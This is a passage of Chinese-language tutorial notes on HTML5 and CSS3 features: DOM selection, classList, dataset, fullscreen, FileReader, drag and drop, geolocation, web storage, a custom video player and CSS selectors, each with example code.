<!--注意事项：视频始终会保持原始的宽高比。意味着如果你同时设置宽高，并不是真正的将视频的画面大小设置为指定的大小，而只是将视频的占据区域设置为指定大小，除非你设置的宽高刚好就是原始的宽高比例。所以建议：在设置视频宽高的时候，一般只会设置宽度或者高度，让视频文件自动缩放-->
<!--<video src="../mp3/mp4.mp4" poster="../images/l1.jpg" controls  height="600"></video>-->

<!--source:因为不同的浏览器所支持的视频格式不一样，为了保证用户能够看到视频，我们可以提供多个视频文件让浏览器自动选择-->
<!--<video src="../mp3/flv.flv" controls></video>-->
<video controls>
    <!--视频源，可以有多个源-->
    <source src="../mp3/flv.flv" type="video/flv">
    <source src="../mp3/mp4.mp4" type="video/mp4">
</video>

<script src="../js/html5shiv.min.js"></script>
<script>

</script>
</body>
</html>
```
>[success] # 新增的dom 和class 
```
1.document.querySelector通过CSS选择器获取元素，符合匹配条件的第1个元素
2.document.querySelectorAll('selector') 通过CSS选择器获取元素，以类数组形式存在。
3.Node.classList.add('class') 添加class
4.Node.classList.remove('class') 移除class
5.Node.classList.toggle('class') 切换class，有则移除，无则添加
6.Node.classList.contains('class') 检测是否存在class
```
>[danger] ##### querySelector 案例
```
    <style>
        .red{
            color: red;
        }
        .green{
            color: green;
        }
        .blue{
            color: blue;
        }
    </style>
</head>
<body>
<ul>
    <li>请选择</li>
    <li class="red">前端</li>
    <li class="green">java</li>
    <li class="blue">javascript</li>
    <li id="c">c++</li>
</ul>
<script>
    /*获取第一个li标签*/
    window.onload=function(){
        
        /*query:查询  Selector：选择器   querySelector(传入选择器名称)*/
        /*querySelector:获取单个元素，如果获取的元素不止一个，那么只会返回满足条件的第一个元素*/
        /*参数要求：如果是类选择器，必须添加.  如果是id选择器， 必须添加# ,否则当成标签处理*/
        var javaLi=document.querySelector(".green");
        //var javaLi=document.querySelector("#c");
        console.log(javaLi);

        /*querySelectorAll获取满足条件的所有元素--数组*/
        var allLi=document.querySelectorAll("li")[0];
        console.log(allLi);
    }
</script>
```
>[danger] #####  class
```
1.classList.item(2) 获取样式中第二个样式名称
```
```
    <style>
        .red{
            color:red
        }
        .green{
            color: green;
        }
        .blue{
            color: blue;
        }
        .underline{
            text-decoration: underline;
        }
    </style>
</head>
<body>
<ul>
    <li class="red">前端与移动开发</li>
    <li class="blue">java</li>
    <li>javascript</li>
    <li class="red">c++</li>
</ul>
<input type="button" value="为第一个li元素添加样式" id="add">
<input type="button" value="为第二个li元素移除样式" id="remove">
<input type="button" value="为第三个li元素切换样式" id="toggle">
<input type="button" value="判断第四个li元素是否包含某个样式" id="contain">
<script>
    window.onload=function(){
        /*add:为元素添加指定名称的样式.一次只能添加一个样式*/
        document.querySelector("#add").onclick=function(){
            /*classList:当前元素的所有样式列表-数组*/
            document.querySelector("li").classList.add("red");
            document.querySelector("li").classList.add("underline");
            //document.querySelector("li").className="red underline"
            /*获取样式*/
            var result=document.querySelector("li").classList.item(2);
            console.log(result);
        }

        /*remove:为元素移除指定名称的样式(不是移除class属性)，一次也只能移除一个*/
        document.querySelector("#remove").onclick=function(){
            document.querySelector(".blue").classList.remove("blue");
        }

        /*toggle：切换元素的样式：如果元素之前没有指定名称的样式则添加。如果有则移除*/
        document.querySelector("#toggle").onclick=function(){
            document.querySelectorAll("li")[2].classList.toggle("green");
        }

        /*contains:判断元素是否包含指定名称的样式，返回true/false*/
        document.querySelector("#contain").onclick=function(){
            var isContain=document.querySelectorAll("li")[3].classList.contains("red");
            console.log(isContain);
        }
    }
</script>
```
>[success] # 统一自定义标签
```
1.data-开头
2.data-后必须至少有一个字符，多个单词使用-连接
3.将data-后面的单词使用camel命名法连接:必须使用camel合法法获取值否则有可能无法获取到值
4.dataset 获取
```
>[danger] ##### 案例
```
<!--定义-->
<!--规范：
1.data-开头
2.data-后必须至少有一个字符，多个单词使用-连接
建议：
1.名称应该都使用小写--不要包含任何的大写字符
2.名称中不要有任何的特殊符号
3.名称不要副作用纯数字-->
<p data-school-name="itcast">12</p>
<p data-name="itcast">12</p>

<!--取值-->
<script>
    window.onload=function(){
        var p=document.querySelector("p");
        /*获取自定义属性值*/
        /*将data-后面的单词使用camel命名法连接:必须使用camel合法法获取值否则有可能无法获取到值*/
        //var value=p.dataset["schoolname"];//data-schoolname
        var value=p.dataset["schoolName"];//data-school-name
        console.log(value);
    }
</script>
```
>[success] # tab 切换案例
![](https://box.kancloud.cn/48f37f28bcb2eaca109b30ecc94ab26d_513x143.png)

>[danger] ##### 代码
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        *{
            padding: 0px;
            margin: 0px;
        }
        .tabs{
            width: 500px;
            border: 1px solid #ccc;
            box-sizing: border-box;
            margin:0 auto;
        }
        .tabs > div{
            width: 100%;
        }
        .tabs > div>a{
            width: 25%;
            height: 50px;
            display: block;
            line-height: 50px;
            text-align: center;
            float: left;
            background-color: #ceffbb;
            border-right: 2px solid #fff;
            box-sizing: border-box;
            text-decoration: none;
        }
        .tabs > div > a.active{
            background-color: #ffcea1;
        }
        .tabs > div > a:last-child{
            border-right:none;
        }
        .tabs > section{
            width:100%;
            display: none;
            padding: 20px;
            /*因为上面的四个标题是浮动的所以内容和标要清初浮动*/
            clear: both;
        }
        .tabs > section > ol{
            padding-left:30px;
        }
        .tabs > section > ol > li{
            line-height: 40px;
        }
    </style>
</head>
<body>
<div class="tabs">
    <div>
        <a href="javascript:;" data-target="local">国内新闻</a>
        <a href="javascript:;" data-target="global">国际新闻</a>
        <a href="javascript:;" data-target="sports">体育新闻</a>
        <a href="javascript:;" data-target="funny">娱乐新闻</a>
    </div>
    <section class="" id="local">
        <ol>
            <li>国内新闻</li>
        </ol>
    </section>

    <section class="" id="global">
        <ol>
            <li>国际新闻</li>
        </ol>
    </section>

    <section class=""  id="sports">
        <ol>
            <li>体育新闻</li>
        </ol>
    </section>

    <section  id="funny" >
        <ol>
            <li>娱乐新闻</li>
        </ol>
    </section>
</div>

<script src="../js/html5shiv.min.js"></script>
<script>
    /*1.获取到所有a标签*/
    /*2.为a标签添加点击事件*/
    /*3.当点击某个a标签的时候，获取到当前a标签的target属性值，让对应名称的section面板显示*/
    /*4.让上一个被点击的超链接的样式清除，同时让对应名称的面板隐藏*/
    (function (index) {
        var allA=document.querySelectorAll('a');
        for(var i=0;i<allA.length;i++){
            // 判断初始化显示 标签内容
            if(i==index){
                allA[i].classList.add('active');
                // 用data 属性获取值
                var firstTarget=allA[i].dataset['target'];
                document.querySelector("#"+firstTarget).style.display="block";
            }
            allA[i].onclick=function(){
                /*先找到上一个被点击的a标签*/
                var lastA=document.querySelector('.active');
                lastA.classList.remove('active');
                var lastTarget=lastA.dataset['target'];
                /*让其隐藏*/
                document.querySelector("#"+lastTarget).style.display="none";


                /*1.添加active样式*/
                this.classList.add('active');
                /*2.获取target属性值*/
                var target=this.dataset['target'];
                /*3.让对应名称的面板显示*/
                document.querySelector("#"+target).style.display="block";
            }
        }
    })(3)
</script>
</body>
</html>
```
[html5--网络接口](html5--网络接口.md)
[html5--全屏接口](html5--全屏接口.md)
[html5---读取文档信息](html5---读取文档信息.md)
[html5--拖拽](html5--拖拽.md)
[html5--地图](html5--地图.md)
[html5--数据存储](html5--数据存储.md)
[html5--视频案例](html5--视频案例.md)

>[success] # 网络接口
```
1.window.addEventListener 网络连接触发
2.window.addEventListener 网络断开触发
```
>[danger] ##### 案例
```
<script>
    /*1.ononline:网络连通的时候触发这个事件*/
    window.addEventListener("online",function(){
        alert("网络连通了");
    });

    /*2.onoffline:网络断开时触发*/
    window.addEventListener("offline",function(){
        alert("网络断开了");
    })
</script>
```
>[success] # html5全屏接口
```
1.requestFullScreen()---开启全屏显示不同浏览器需要添加不同的前缀,chrome:webkit   firefox:moz   ie:ms   opera:o
2.cancelFullScreen()--退出全屏显示,也添加前缀，在不同的浏览器下.退出全屏只能使用document来实现
3.fullScreenElement()--是否是全屏状态,是否是全屏状态，也只能使用document进行判断
```
>[danger] ##### 案例
```
<div>
    <img src="../images/l1.jpg" alt="">
    <input type="button" id="full" value="全屏">
    <input type="button" id="cancelFull" value="退出全屏">
    <input type="button" id="isFull" value="是否全屏">
</div>
<script>
    /*全屏操作的主要方法和属性
    * 1.requestFullScreen():开启全屏显示
    *   不同浏览器需要添加不同的前缀
    *   chrome:webkit   firefox:moz   ie:ms   opera:o
    * 2.cancelFullScreen():退出全屏显示:也添加前缀，在不同的浏览器下.退出全屏只能使用document来实现
    * 3.fullScreenElement:是否是全屏状态，也只能使用document进行判断*/

    window.onload=function(){
        var div=document.querySelector("div");
        /*添加三个按钮的点击事件*/
        /*全屏操作*/
        document.querySelector("#full").onclick=function(){
            /*div.requestFullScreen();*/
            /*div.webkitRequestFullScreen();*/
            /*div.mozRequestFullScreen();*/
            /*使用能力测试添加不同浏览器下的前缀*/
            if(div.requestFullScreen){
                div.requestFullScreen();
            }
            else if(div.webkitRequestFullScreen){
                div.webkitRequestFullScreen();
            }
            else if(div.mozRequestFullScreen){
                div.mozRequestFullScreen();
            }
            else if(div.msRequestFullScreen){
                div.msRequestFullScreen();
            }
        }

        /*退出全屏*/
        document.querySelector("#cancelFull").onclick=function(){
            if(document.cancelFullScreen){
                document.cancelFullScreen();
            }
            else if(document.webkitCancelFullScreen){
                document.webkitCancelFullScreen();
            }
            else if(document.mozCancelFullScreen){
                document.mozCancelFullScreen();
            }
            else if(document.msCancelFullScreen){
                document.msCancelFullScreen();
            }
        }

        /*判断是否是全屏状态*/
        document.querySelector("#isFull").onclick=function(){
            /*两个细节：使用document判断  能力测试*/
            if(document.fullscreenElement || document.webkitFullscreenElement || document.mozFullScreenElement || document.msFullscreenElement){
                alert(true);
            }
            else{
                alert(false);
            }
        }
    }
</script>
```
>[success] # html 读取文本信息
```
1.创建读取文本对象  new FileReader()
2.FileReader 对象的三种操作
	readAsText() --- 读取文本文件(可以使用Txt打开的文件)，返回文本字符串，默认编码是UTF-8
    readAsBinaryString() --- 读取任意类型的文件。返回二进制字符串。这个方法不是用来读取文件展示给用户看，而是存储文件。例如：读取文件的内容，获取二进制数据，传递给后台，后台接收了数据之后，再将数据存储
    readAsDataURL():读取文件获取一段以data开头的字符串，这段字符串的本质就是DataURL.DataURL是一种将文件(这个文件一般就是指图像或者能够嵌入到文档的文件格式)嵌入到文档的方案。DataURL是将资源转换为base64编码的字符串形式，并且将这些内容直接存储在url中>>优化网站的加载速度和执行效率。
3.上面方法的参数需要的是获取files返回值 例如document.querySelector("#myFile").files
4.在读取文件的时候几个捕获事件的方法
    * onabort:读取文件中断片时触发
    * onerror:读取错误时触发
    * onload:文件读取成功完成时触发
    * onloadend:读取完成时触发，无论成功还是失败
    * onloadstart:开始读取时触发
    * onprogress:读取文件过程中持续触发
```

>[danger] ##### 案例
```
1.获取读取结果 使用result获取后给img的src赋值
```
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        div{
            height: 20px;
            width: 0%;
            background-color:red;
        }
    </style>
</head>
<body>
<form action="">
    文件： <input type="file" name="myFile" id="myFile" > <br>
    <div></div>
    <input type="submit">
</form>
<img src="" alt="">
<script>
    var div=document.querySelector('div')
    var img=document.querySelector('#myFile')
    img.onchange=function () {
        getFileConetent()
    }
    function getFileConetent() {
        // 创建一个读取文件对象
        var reader = new FileReader()
        //获取读取文本文件内容
        var file = img.files;
        console.log(this)
        console.log(file)
        reader.readAsDataURL(file[0]);
        reader.onload=function(){
            //console.log(reader.result);
            /*展示*/
            document.querySelector("img").src=reader.result;
        }
        //读取图片的进度条
        reader.onprogress=function(e){
            var percent= e.loaded/ e.total*100+"%";
            div.style.width=percent;
        }
    }

</script>
</body>
</html>
```
>[success] # html5 拖拽
```
1.拖拽是两个元素构成一个是被拖拽元素，一个是目标元素
```
![](https://box.kancloud.cn/1d340d3c93ce70b9a6eee1926f61d5d6_315x172.png)

>[danger] ##### 被拖拽元素
```
应用于被拖拽元素的事件:
ondrag         应用于拖拽元素，整个拖拽过程都会调用--持续
ondragstart    应用于拖拽元素，当拖拽开始时调用
ondragleave    应用于拖拽元素，当鼠标离开拖拽元素时调用
ondragend    应用于拖拽元素，当拖拽结束时调用
```
>[danger] ##### 是目标元素
```
应用于目标元素的事件
ondragenter    应用于目标元素，当拖拽元素进入时调用
ondragover    应用于目标元素，当停留在目标元素上时调用
ondrop        应用于目标元素，当在目标元素上松开鼠标时调用
ondragleave    应用于目标元素，当鼠标离开目标元素时调用
```
>[danger] ##### 最简单的案例
```
1.如果想触发ondrop事件，那么就必须在这个位置阻止浏览器的默认行为
2.浏览器默认会阻止ondrop事件：我们必须在ondragover中阻止浏览器的默认行为
3.在出发ondrop加入拖住元素
```
```
    <style>
        *{
            margin: 0;
            padding: 0;
        }
        .div1{
            width: 200px;
            height: 200px;
            border: 1px solid red;
            position: relative;
            margin-left:20px;
            float: left;
        }
        .div2{
            width: 200px;
            height: 200px;
            border: 1px solid blue;
            position: relative;
            margin-left:20px;
            float: left;
        }
        .div3{
            width: 200px;
            height: 200px;
            border: 1px solid green;
            position: relative;
            margin-left:20px;
            float: left;
        }
        p{
            background-color: orange;
            margin-top: 5px;
        }
    </style>
</head>
<body>
<div class="div1" id="div1">
    <!--在h5中，如果想拖拽元素，就必须为元素添加draggable="true". 图片和超链接默认就可以拖拽-->
    <p id="pe" draggable="true">试着把我拖过去</p>
</div>
<div class="div2" id="div2"></div>
<script>
    var p=document.querySelector("#pe");
    var div2=document.querySelector("#div2");
    var div1=document.querySelector("#div1");
    p.ondragstart = function () {
        console.log('当拖拽开始时调用')
    }
    p.ondragend=function(){
        console.log("当拖拽结束时调用");
    }
    p.ondragleave=function(){
        console.log("当鼠标离开拖拽元素时调用");
    }
    p.ondrag=function(){
        console.log("整个拖拽过程都会调用");
    }
    div2.ondragenter=function(){
        console.log("当拖拽元素进入时调用");
    }
    div2.ondragover=function(e){
        console.log("当停留在目标元素上时调用");
        /*如果想触发ondrop事件，那么就必须在这个位置阻止浏览器的默认行为*/
        e.preventDefault();
    }
    /*浏览器默认会阻止ondrop事件：我们必须在ondragover中阻止浏览器的默认行为*/
    div2.ondrop=function(){
        console.log("当鼠标离开目标元素时调用");
        /*添加被拖拽的元素到当前目标元素*/
        div2.appendChild(p);
    }
    div2.ondragleave=function(){
        console.log("当鼠标离开目标元素时调用");
    }
</script>
```
>[danger] ##### 通用方法
```
1.使用document 调用元素ondragstart的参数中可以获取拖拽的元素。在setData中可以保存 记录拖拽元素
2.只能在ondrop 获取拖拽元素
```
```
   <style>
        *{
            margin: 0;
            padding: 0;
        }
        .div1{
            width: 200px;
            height: 200px;
            border: 1px solid red;
            position: relative;
            margin-left:20px;
            float: left;
        }
        .div2{
            width: 200px;
            height: 200px;
            border: 1px solid blue;
            position: relative;
            margin-left:20px;
            float: left;
        }
        .div3{
            width: 200px;
            height: 200px;
            border: 1px solid green;
            position: relative;
            margin-left:20px;
            float: left;
        }
        p{
            background-color: orange;
            margin-top: 5px;
        }
    </style>
</head>
<body>
<div class="div1" id="div1">
    <!--在h5中，如果想拖拽元素，就必须为元素添加draggable="true". 图片和超链接默认就可以拖拽-->
    <p id="pe" draggable="true">试着把我拖过去</p>
    <p id="pe1" draggable="true">试着也把我拖过去</p>
</div>
<div class="div2" id="div2"></div>
<div class="div3" id="div3"></div>
<script>
    /*学习拖拽，主要就是学习拖拽事件*/
    var obj=null;//当前被拖拽的地元素

    /*应用于被拖拽元素的事件
    *ondrag         应用于拖拽元素，整个拖拽过程都会调用--持续
     ondragstart    应用于拖拽元素，当拖拽开始时调用
     ondragleave    应用于拖拽元素，当鼠标离开拖拽元素时调用
     ondragend    应用于拖拽元素，当拖拽结束时调用*/
    document.ondragstart=function(e){
        /*通过事件捕获来获取当前被拖拽的子元素*/
        e.target.style.opacity=0.5;
        e.target.parentNode.style.borderWidth="5px";
        obj= e.target;
        /*通过dataTransfer来实现数据的存储与获取
        * setData(format,data):
        * format:数据的类型：text/html   text/uri-list
        * Data:数据:一般来说是字符串值*/
        e.dataTransfer.setData("text/html", e.target.id);
    }
    document.ondragend=function(e){
        e.target.style.opacity=1;
        e.target.parentNode.style.borderWidth="1px";
    }
    document.ondragleave=function(e){
    }
    document.ondrag=function(e){
    }

    /*应用于目标元素的事件
    *ondragenter    应用于目标元素，当拖拽元素进入时调用
     ondragover    应用于目标元素，当停留在目标元素上时调用
     ondrop        应用于目标元素，当在目标元素上松开鼠标时调用
     ondragleave    应用于目标元素，当鼠标离开目标元素时调用*/
    document.ondragenter=function(e){
        console.log(e.target);
    }
    document.ondragover=function(e){
        /*如果想触发ondrop事件，那么就必须在这个位置阻止浏览器的默认行为*/
        e.preventDefault();
    }
    /*浏览器默认会阻止ondrop事件：我们必须在ondragover中阻止浏览器的默认行为*/
    document.ondrop=function(e){
        /*添加元素*/
        //e.target.appendChild(obj);
        /*通过e.dataTransfer.setData存储的数据，只能在drop事件中获取*/
        var id=e.dataTransfer.getData("text/html");
        /*console.log("id="+id);*/
        e.target.appendChild(document.getElementById(id));
    }
    document.ondragleave=function(e){
    }
</script>
```
>[success] # 地图
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        .de{
            width: 300px;
            height: 300px;
            border: 1px solid #ddd;
        }
    </style>
</head>
<body>
<div id="demo" class="de"></div>
<script>
    var x=document.getElementById("demo");
    function getLocation()
    {
        /*能力测试判断浏览器能否获取定位信息  */
        if (navigator.geolocation)
        {
            /*1.获取地理信息成功之后的回调
            * 2.获取地理信息失败之后的回调
            * 3.调整获取当前地进信息的方式*/
            //navigator.geolocation.getCurrentPosition(success,error,option);
            /*option:可以设置获取数据的方式
            * enableHighAccuracy:true/false:是否使用高精度
            * timeout:设置超时时间，单位ms
            * maximumAge:可以设置浏览器重新获取地理信息的时间间隔，单位是ms*/
            navigator.geolocation.getCurrentPosition(showPosition,showError,{
                /*enableHighAccuracy:true,
                timeout:3000*/
            });
        }
        else{
            x.innerHTML="Geolocation is not supported by this browser.";
        }
    }
    /*成功获取定位之后的回调*/
    /*如果获取地理信息成功，会将获取到的地理信息传递给成功之后的回调*/
    // position.coords.latitude 纬度
    // position.coords.longitude 经度
    // position.coords.accuracy 精度
    // position.coords.altitude 海拔高度
    function showPosition(position)
    {
        x.innerHTML="Latitude: " + position.coords.latitude +
                "<br />Longitude: " + position.coords.longitude;
    }
    /*获取定位失败之后的回调*/
    function showError(error)
    {
        switch(error.code)
        {
            case error.PERMISSION_DENIED:
                x.innerHTML="User denied the request for Geolocation."
                break;
            case error.POSITION_UNAVAILABLE:
                x.innerHTML="Location information is unavailable."
                break;
            case error.TIMEOUT:
                x.innerHTML="The request to get user location timed out."
                break;
            case error.UNKNOWN_ERROR:
                x.innerHTML="An unknown error occurred."
                break;
        }
    }
    getLocation();
</script>

</body>
</html>
```
>[success] #  sessionStorage
```
存储数据到本地。存储的容量5mb左右。
    1.这个数据本质是存储在当前页面的内存中-意味着其它页面和浏览器无法获取数据
    2.它的生命周期为关闭当前页面，关闭页面，数据会自动清除

setItem(key,value):存储数据，以键值对的方式存储
getItem(key):获取数据，通过指定名称的key获取对应的value值
removeItem(key):删除数据，通过指定名称key删除对应的值
clear():清空所有存储的内容
```
>[danger] ##### 使用
```
<input type="text" id="userName"><br>
<input type="button" value="设置数据" id="setData">
<input type="button" value="获取数据" id="getData">
<input type="button" value="删除数据" id="removeData">
<script>
    /*存储数据*/
    document.querySelector("#setData").onclick=function(){
        /*获取用户名*/
        var name=document. ("#userName").value;
        /*存储数据*/
        window.sessionStorage.setItem("userName",name);
    }
    /*获取数据*/
    document.querySelector("#getData").onclick=function(){
        /*如果找不到对应名称的key,那么就会获取null*/
        var name=window.sessionStorage.getItem("userName");
        alert(name);
    }
    /*删除数据*/
    document.querySelector("#removeData").onclick=function(){
        /*在删除的时候如果key值错误，不会报错，但是也不会删除数据*/
        window.sessionStorage.removeItem("userName1");
    }
</script>
```
>[success] #  localStorage
```
localStorage的使用：
    1.存储的内容大概20mb
    2.不同浏览器不能共享数据。但是在同一个浏览器的不同窗口中可以共享数据
    3.永久生效，它的数据是存储在硬盘上，并不会随着页面或者浏览器的关闭而清除.如果想清除，必须手动清除

setItem(key,value):存储数据，以键值对的方式存储
getItem(key):获取数据，通过指定名称的key获取对应的value值
removeItem(key):删除数据，通过指定名称key删除对应的值
clear():清空所有存储的内容
```
>[danger] ##### 使用
```
<input type="text" id="userName"><br>
<input type="button" value="设置数据" id="setData">
<input type="button" value="获取数据" id="getData">
<input type="button" value="删除数据" id="removeData">

<script>
    document.querySelector("#setData").onclick=function(){
        var name=document.querySelector("#userName").value;
        /*使用localStorage存储数据*/
        window.localStorage.setItem("userName",name);
    }
    /*获取数据*/
    document.querySelector("#getData").onclick=function(){
        var name=window.localStorage.getItem("userName");
        alert(name);
    }
    /*清除数据*/
    document.querySelector("#removeData").onclick=function(){
        window.localStorage.removeItem("userName");
    }
</script>
```
>[danger] ##### 代码
```
1.第六步的current 改变第五步也会变
```
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        body {
            padding: 0;
            margin: 0;
            font-family: 'microsoft yahei', 'Helvetica', simhei, simsun, sans-serif;
            background-color: #F7F7F7;
        }

        a {
            text-decoration: none;
        }
        .playerTitle{
            width:100%;
            margin: 0 auto;
            line-height:100px;
            font-size: 40px;
            text-align: center;
        }
        .player{
            width: 720px;
            height: 360px;
            margin: 0 auto;
            background: url("../images/loading.gif") center no-repeat;
            background-size: cover;
            position: relative;
        }
        video{
            height:100%;
            margin: 0 auto;
            display: none;
        }
        .controls {
            width: 720px;
            height: 40px;
            position: absolute;
            left: 0px;
            bottom: -40px;
            background-color: #000;
        }
        .controls > .switch{
            width: 20px;
            height: 20px;
            display: block;
            font-size: 20px;
            color: #fff;
            position: absolute;
            left: 10px;
            top: 10px;
        }
        .controls > .expand{
            width: 20px;
            height: 20px;
            display: block;
            font-size: 20px;
            color: #fff;
            position: absolute;
            right: 10px;
            top: 10px;
        }
        .controls > .progress{
            width: 430px;
            height: 10px;
            position: absolute;
            left:40px;
            bottom:15px;
            background-color: #555;
        }
        .controls > .progress > .bar{
            width:100%;
            height:100%;
            border-radius: 3px;
            cursor: pointer;
            position: absolute;
            left: 0;
            top: 0;
            opacity: 0;
            z-index: 999;
        }
        .controls > .progress > .loaded{
            width:60%;
            height:100%;
            background-color: #999;
            border-radius: 3px;
            position: absolute;
            left: 0;
            top: 0;
            z-index: 2;
        }
        .controls > .progress > .elapse{
            width:0%;
            height:100%;
            background-color: #fff;
            border-radius: 3px;
            position: absolute;
            left: 0;
            top: 0;
            z-index: 3;
        }
        .controls > .time{
            height: 20px;
            position: absolute;
            left:490px;
            top: 10px;
            color: #fff;
            font-size: 14px;
        }
    </style>
    <link rel="stylesheet" href="../css/font-awesome.css">

</head>
<body>
<h3 class="playerTitle">视频播放器</h3>
<div class="player">
    <video src="../mp4/chrome.mp4" ></video>
    <div class="controls">
        <a href="javascript:;" class="switch fa fa-play"></a>
        <a href="javascript:;" class="expand fa fa-expand"></a>
        <div class="progress">
            <div class="bar"></div>
            <div class="loaded"></div>
            <div class="elapse"></div>
        </div>
        <div class="time">
            <span class="currentTime">00:00:00</span>
            \
            <span class="totalTime">00:00:00</span>
        </div>
    </div>
</div>
<script src="../js/jquery.min.js"></script>
<script>
    $(function(){
        /*1.获取播放器*/
        var video=$("video")[0];

        /*2.实现播放与暂停*/
        $(".switch").click(function(){
            /*实现播放与暂停的切换：如果是暂停>>播放  ，如果是播放 >> 暂停*/
            if(video.paused){
                video.play();
                /*移除暂停样式，添加播放样式*/
            }
            else{
                video.pause();
                /*移除播放样式，添加暂停样式*/
            }
            /*设置标签的样式  fa-pause:暂停   fa-play：播放*/
            $(this).toggleClass("fa-play fa-pause");
        });

        /*3.实现全屏操作*/
        $(".expand").click(function(){
            /*全屏>>不同浏览器需要添加不同的前缀>>能力测试*/
            if(video.requestFullScreen){
                video.requestFullScreen();
            }
            else if(video.webkitRequestFullScreen){
                video.webkitRequestFullScreen();
            }
            else if(video.mozRequestFullScreen){
                video.mozRequestFullScreen();
            }
            else if(video.msRequestFullScreen){
                video.msRequestFullScreen();
            }
        });

        /*4.实现播放业务逻辑：当视频文件可以播放时触发下面的事件*/
        video.oncanplay=function(){
            setTimeout(function(){
                /*1.将视频文件设置为显示*/
                video.style.display="block";
                /*2.获取当前视频文件的总时长(以秒做为单位，同时获取了小数值)，计算出时分秒*/
                var total=video.duration; //01:01:40   00:00:36
                /*3.计算时分少  60*60=3600
                * 3700:3700/3600
                * 3700:3700%3600 >> 100 /60*/
                /*var hour=Math.floor(total/3600);
                /!*补0操作*!/
                hour=hour<10?"0"+hour:hour;
                var minute=Math.floor(total%3600/60);
                minute=minute<10?"0"+minute:minute;
                var second=Math.floor(total%60);
                second=second<10?"0"+second:second;*/
                var result=getResult(total)
                /*4.将计算结果展示在指定的dom元素中*/
                $(".totalTime").html(result);
            },2000);
        }

        /*通过总时长计算出时分秒*/
        function getResult(time){
            var hour=Math.floor(time/3600);
            /*补0操作*/
            hour=hour<10?"0"+hour:hour;
            var minute=Math.floor(time%3600/60);
            minute=minute<10?"0"+minute:minute;
            var second=Math.floor(time%60);
            second=second<10?"0"+second:second;
            /*返回结果*/
            return hour+":"+minute+":"+second;
        }

        /*5.实现播放过程中的业务逻辑，当视频播放时会触发ontimeupdate事件
        * 如果修改currentTime值也会触发这个事件，说白了，只要currenTime值变化，就会触发这个事件*/
        video.ontimeupdate=function(){
            /*1.获取当前的播放时间*/
            var current=video.currentTime;
            /*2.计算出时分秒*/
            var result=getResult(current);
            /*3.将结果展示在指定的dom元素中*/
            $(".currentTime").html(result);
            /*4.设置当前播放进度条样式  0.12>>0.12*100=12+%>12%*/
            var percent=current/video.duration*100+"%";
            $(".elapse").css("width",percent);
        }

        /*6.实现视频的跳播*/
        $(".bar").click(function(e){
            /*1.获取当前鼠标相对于父元素的left值--偏移值*/
            var offset= e.offsetX;
            /*2.计算偏移值相对总父元素总宽度的比例*/
            var percent=offset/$(this).width();
            /*3.计算这个位置对应的视频进度值*/
            var current=percent*video.duration;
            /*4.设置当前视频的currentTime*/
            video.currentTime=current;
        });

        /*7.播放完毕之后，重置播放器的状态*/
        video.onended=function(){
            video.currentTime=0;
            $(".switch").removeClass("fa-pause").addClass("fa-play");
        }
    });
</script>
</body>
</html>
```
[css3选择器](css3选择器.md)
[盒子属性](盒子属性.md)
[伪元素首字下沉](伪元素首字下沉.md)
[颜色透明度](颜色透明度.md)
[文本阴影](文本阴影.md)
[backgrou 设置](backgrou设置.md)
[过渡动画效果](html5过渡效果.md)
[2D效果](2D效果.md)
[3D效果](3D效果.md)
[帧动画效果](帧动画效果.md)
[字体](字体.md)
[多列布局](多列布局.md)
[弹性盒子布局](弹性盒子布局.md)
[全屏滚动效果动画](全屏滚动效果动化.md)

[属性选择器](属性选择器.md)
[兄弟选择器](兄弟选择器.md)
[伪类选择器](html5--伪类选择器.md)
[创建befor-after](创建befor-after.md)

[toc]
>[success] # html5 css3属性选择器
```
CSS3新增了许多灵活查找元素的方法，极大的提高了查找元素的效率和精准度。
CSS3选择器与jQuery中所提供的绝大部分选择器兼容
```
>[success] # 属性选择器
```
1.E[attribute] 表示存在attr属性即可；--- div[class]
2.E[attr=val] 表示属性值完全等于val；--- div[class=mydemo]
3.E[attr*=val] 表示的属性值里包含val字符并且在“任意”位置；--- div[class*=mydemo]
4.E[attr^=val] 表示的属性值里包含val字符并且在“开始”位置；--- div[class^=mydemo]
5.E[attr$=val] 表示的属性值里包含val字符并且在“结束”位置；--- div[class$=demos]
```
>[danger] ##### 案例
![](https://box.kancloud.cn/28a93fafbcf1663e65ecc27996f5d7f0_265x315.png)
```
<style>
/*属性选择器：属性是相对于标签而言。所谓属性选择器就是根据指定名称的属性的值来查找元素*/
/*1.E[attr]:查找指定的拥有attr属性的E标签。如查找拥有style属性的li标签*/
li[style]{
	text-decoration: underline;
}
/*2.E[attr=value]:查找拥有指定的Attr属性并且属性值为value的E标签。如想查找拥有type属性并且值为text的input标签   =是严格匹配*/
	ol>input[type=text]{
	width: 10px;
}
/*3.E[attr*=value]:查找拥有指定的attr属性并且属性值中包含(可以在任意位置)value的E标签*/
	li[class*=red]{
	font-size: 30px;
}
/*4.E[attr^=value]:查找拥有指定的attr属性并且属性值以value开头的E标签*/
	li[class^=blue]{
	font-size: 10px;
}
/*5.E[attr$=value]:查找拥有指定的attr属性并且属性值以value开结束的E标签*/
	li[class$=red]{
	/*font-size: 30px;*/
}
</style>
</head>
<body>
<p style="">添加样式效果</p>
<ol>
    <!--宽度为10-->
    <input type="text">
    <li class="red" style="">第一个li</li>
    <li class="blue" >第二个li</li>
    <li class="red23" >第三个li</li>
    <li class="darkred" >第四个li</li>
    <li class="red" >第五个li</li>
    <li class="blueviolet" >第六个li</li>
</ol>
<!--宽度正常-->
<input type="text">

</body>
```
[TOC]
>[success] # 兄弟选择器
```
1.+：获取当前元素的相邻的满足条件的元素
2.~：获取当前元素的满足条件的兄弟元素
3.指定的样式 ~/+ 标签一定是标签
```
>[danger] ##### 案例
![](https://box.kancloud.cn/68fb918309edbf4c5af92f9703ddb831_227x249.png)
```
    <style>
        .first{
            color: red;
        }
        /*兄弟伪类：
        +：获取当前元素的相邻的满足条件的元素
        ~：获取当前元素的满足条件的兄弟元素*/

        /*下面这句样式说明查找 ：添加了.first样式的标签的相邻的li元素
        1.相邻
        2.必须是指定类型的元素*/
        .first + li{
            color: blue;
        }

        /*下面样式查找添加了.first样式的元素的所有兄弟li元素
        1.必须是指定类型的元素*/
        .first ~ li{
            color: pink;
        }
    </style>
</head>
